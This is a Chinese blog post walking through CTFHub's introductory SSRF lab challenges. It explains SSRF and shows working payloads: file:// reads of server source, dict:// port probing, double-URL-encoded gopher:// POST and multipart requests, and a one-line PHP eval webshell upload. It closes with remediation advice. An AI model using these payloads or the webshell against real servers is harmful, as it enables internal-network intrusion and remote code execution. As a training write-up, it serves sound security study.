---
title: "SSRF学习之ctfhub靶场-基础部分"
categories: [ "安全技术","CTF" ]
tags: [ "SSRF" ]
draft: false
slug: "565"
date: "2020-12-26 01:42:00"
---

# 概念

> SSRF，全称为 Server-Side Request Forgery，服务器端请求伪造，是攻击者能够代表服务器发送请求时产生的漏洞。它允许攻击者“伪造”易受到攻击服务器的请求签名，从而在 web 上占据主导地位，绕过防火墙控制并获得对内部服务的访问权限

形成原因：由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据

那么在什么时候可能产生`SSRF`呢？最常见的是当服务器需要外部资源时

比如`web`需要从`google`加载一张缩略图，此时的请求可能是这样的：

```
https://public.example.com/upload_profile_from_url.php?url=www.google.com/cute_pugs.jpeg
```

当从`google.com`获取`cutpugs.jpeg`时，`Web`应用程序必须访问`google.com`并从`google.com`中检索内容

如果服务器不区分内部和外部资源，攻击者就可以轻松地发出请求：

```
https://public.example.com/upload_profile_from_url.php?url=localhost/secret_password_file.txt
```

然后使`web`服务器向攻击者的`web`服务器显示包含密码的文件

列举几个经常易受`SSRF`攻击的功能，包括`Web hook`、通过`URL`上传文件、文档和图像处理、链接扩展和代理服务(因为这些功能都需要访问和获取外部资源)

在 PHP 中：某些函数的不当使用会导致 SSRF：如

- file_get_conntents():把文件写入字符串，当 url 是内网文件时，会先把这个文件的内容读出来再写入，导致了文件读取
- fsockopen():实现获取用户指定 url 的数据(文件或者 html)，这个函数会使用 socket 跟服务器建立 tcp 连接，传输原始数据
- curl_exec():通过 file、dict、gopher 三个协议来进行渗透

危害：获取`web`应用可达服务器服务的`banner`信息，以及收集内网`web`应用的指纹识别，

根据这些信息再进行进一步的渗透，攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，

对有漏洞的内网`web`应用实施攻击获取`webshell`

利用由脆弱性的组件结合`ftp://、file://、dict://`等协议实施攻击

漏洞发生点：

- 通过`url`地址分享网页内容
- 文件处理、编码处理、转码等服务
- 在线翻译
- 通过 url 地址加载与下载图片
- 图片、文章收藏功能
- 未公开的 api 实现及其他调用 url 的功能
- 网站邮箱收取其他邮箱邮件功能

从`url`关键字寻找：

```
share,wap,url,link,src,source,target,u,3g,display,sourceURL,imageURL,domain
```

下面配合[ctfhub][1]的靶场进行实战讲解

# 0x01 第一题 内网访问

简单演示：

先来一个例子热热身，依然是`ctfhub`技能树`web`第一题 内网访问

题目提示为：尝试访问位于`127.0.0.1`的`flag.php`吧

打开题目为空白，`url`为`xxx.com:yyyy/?url=_`

嗯，好，不知道啥意思，这篇文章到此结束。。了吗？不可能的

`url=127.0.0.1/flag.php`

![][2]

好下一个

# 0x02 第二题 端口扫描

题目提示端口在`8000-9000`，因此直接扫就可以了

这里我们需要使用`dict`伪协议来扫描，因为`dict`协议可以用来探测开放的端口

伪协议可以参考文末的参考文章进行学习

![][3]

![][4]

得到端口`8605`：

![][5]

得到`flag`，接下来看下一题`POST`请求

# 0x03 第三题 POST 请求

题目描述为

“这次是发一个 HTTP POST 请求.对了.ssrf 是用 php 的 curl 实现的.并且会跟踪 302 跳转.加油吧骚年”

从提示知道应该是需要我们利用`SSRF`发一个`POST`的请求，自然而然就想到了`gopher`

同时题目中也提到了`curl`，而`curl`正好是支持`gopher`协议的，

因此这题大概率就是利用`gopher`发送一个`POST`请求，然后获得`flag`

那先看下存不存在`flag.php`吧：

![][6]

查看`flag.php`果然存在，并且返回中有一个`debug`参数`key`

```
<!-- Debug: key=4a0c2731eeeb016454ef8984765b990d-->
```

需要我们用`gopher`协议通过`302.php`的跳转去用`post key`到`flag.php`，

不过需要注意的是要从`127.0.0.1`发送数据

那我们先看一下能否读取到`flag.php`和`index.php`的内容：

`/?url=file:///var/www/html/flag.php`

```
<?php

error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?>

<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=<?php echo $key;?>-->
</form>
```

`/?url=file:///var/www/html/index.php`

```
<?php

error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

伪协议同样可以参考文末的参考文章进行学习

构造`gopher`数据

我们首先要通过

```
{host}:{port}/index.php?url=http://127.0.0.1/302.php
```

去跳转`gopher`的协议，构造`POST`，结合`gopher`，数据包应该是这样的：

```
gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=4a0c2731eeeb016454ef8984765b990d
```

以上数据包内容缺一不可，需要注意的是

- 特别注意 Content-Length 的长度，这个字段必须有，并且长度不对也是不行的

- 注意更改 key

- URL 编码的次数主要取决于你请求的次数，比如你直接 POST 请求算一次，直接?url 打则需再加一次共 2 次

这里推荐一个巨好用的在线编码网站，[CyberChef][7]

首先在左边搜索栏搜索`url encode`，把这个功能拖到功能栏，

将上面代码复制进去得到第一次`URL`编码的结果（注意默认编码特殊字符不需要勾选编码全部字符）：

```
gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%20%0AContent-Type:%20application/x-www-form-urlencoded%0A%0Akey=4a0c2731eeeb016454ef8984765b990d
```

此处需要对换行进行处理，默认换行编码为`%0A`，但我们需要把它换为`%0D%0A`，

于是在页面左边搜索`Find / Replace`拖到功能栏按照所属进行配置：

```
gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Length:%2036%20%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=4a0c2731eeeb016454ef8984765b990d
```

最后由于我们是通过`?url`过去的，所以需要再编码一次：

![][8]

最终的包为：

```
GET http://challenge-8270f589b8f8abf8.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%2520%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=4a0c2731eeeb016454ef8984765b990d HTTP/1.1
Host: challenge-8270f589b8f8abf8.sandbox.ctfhub.com:10080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

发包得到`flag`：

![][9]

# 0x04 第四题 上传文件

提示为

> 这次需要上传一个文件到 flag.php 了.祝你好运

直接访问`127.0.0.1`下的`flag.php`，发现是一个文件上传界面，提示我们上传`webshell`：

![][10]

但好像只有一个选择文件，没有上传文件的按钮，访问`?url=file:///var/www/html/index.php`，得到`index.php`的源码：

```
<?php

error_reporting(0);

if (!isset($_REQUEST['url'])) {
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

访问`?url=file:///var/www/html/flag.php`，得到`flag.php`的源码：

```
<?php

error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

if (isset($_FILES["file"]) && $_FILES["file"]["size"] > 0) {
    echo getenv("CTFHUB");
    exit;
}
?>

Upload Webshell

<form action="/flag.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
</form>
```

可以发现`flag.php`仅要求上传的文件大小大于 0 即可得到`flag`，并没有任何过滤

接下来我们尝试利用`gopher`协议上传文件，首先需要得到文件上传的数据包，才能编写`gopher`的`payload`

因此我们对这个文件上传的`flag.php`页面进行`F12`前端改写，添加一个`submit`提交按钮

（但这里点击提交按钮是得不到`flag`的，必须从目标机本地访问）

添加一行

```
<input type="submit" name="submit">
```

则会出现一个提交查询按钮：

![][11]

随便选择文件，开启拦截包点击提交查询

![][12]

由于访问`flag`需要本地访问，故把`HOST`改为`127.0.0.1`

```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------22285140113870486144781081380
Content-Length: 379
Origin: http://challenge-ad7efe5d754337a9.sandbox.ctfhub.com:10080
Connection: close
Referer: http://challenge-ad7efe5d754337a9.sandbox.ctfhub.com:10080/?url=127.0.0.1/flag.php
Upgrade-Insecure-Requests: 1

-----------------------------22285140113870486144781081380
Content-Disposition: form-data; name="file"; filename="yjh.php"
Content-Type: application/octet-stream

<?php @eval($_POST['a']);
-----------------------------22285140113870486144781081380
Content-Disposition: form-data; name="submit"

提交查询
-----------------------------22285140113870486144781081380--

```

然后和上面的操作一样`url`编码一次，把`%0A`换成`%0D%0A`，然后再`url`编码一次

```
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:84.0)%2520Gecko/20100101%2520Firefox/84.0%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%250D%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------22285140113870486144781081380%250D%250AContent-Length:%2520379%250D%250AOrigin:%2520http://challenge-ad7efe5d754337a9.sandbox.ctfhub.com:10080%250D%250AConnection:%2520close%250D%250AReferer:%2520http://challenge-ad7efe5d754337a9.sandbox.ctfhub.com:10080/?url=127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests:%25201%250D%250A%250D%250A-----------------------------22285140113870486144781081380%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%2522yjh.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250A%253C?php%2520@eval($_POST%255B'a'%255D);%250D%250A-----------------------------22285140113870486144781081380%250D%250AContent-Disposition:%2520form-data;%2520name=%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2%250D%250A-----------------------------22285140113870486144781081380--%250D%250A
```

进行`gopher`协议的使用，就可以成功得到`flag`：

![][13]

# 修复建议

- 禁用不需要的协议，只允许 HTTP 和 HTTPS 请求，可以防止类似于 file://, gopher://, ftp:// 等引起的问题。

- 白名单的方式限制访问的目标地址，禁止对内网发起请求

- 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

- 验证请求的文件格式

- 禁止跳转

- 限制请求的端口为 http 常用的端口，比如 80、443、8080、8000 等

- 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

参考文章：

- [WEB 安全 SSRF 中 URL 的伪协议][14]
- [CTFHUB-技能树-Web-SSRF(上) - Web_Fresher - 博客园][15]
- [CTFHub-SSRF 部分（已完结）][16]
- [我在 CTFHub 学习 SSRF][17]
- [Web 常见漏洞描述及修复建议][18]

[1]: https://www.ctfhub.com/#/index
[2]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_012800.png
[3]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_012936.png
[4]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_012958.png
[5]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013021.png
[6]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013152.png
[7]: https://gchq.github.io/CyberChef/
[8]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013522.png
[9]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013613.png
[10]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013714.png
[11]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013907.png
[12]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_013935.png
[13]: https://img.soapffz.com/archives_img/2020/12/26/archives_20201226_014115.png
[14]: https://www.cnblogs.com/-mo-/p/11673190.html
[15]: https://www.cnblogs.com/Web-Fresher/p/13723103.html
[16]: https://blog.csdn.net/rfrder/article/details/108589988
[17]: https://www.freebuf.com/articles/web/258365.html
[18]: https://mp.weixin.qq.com/s/saNLDe4OprhrsdfQ2scmpg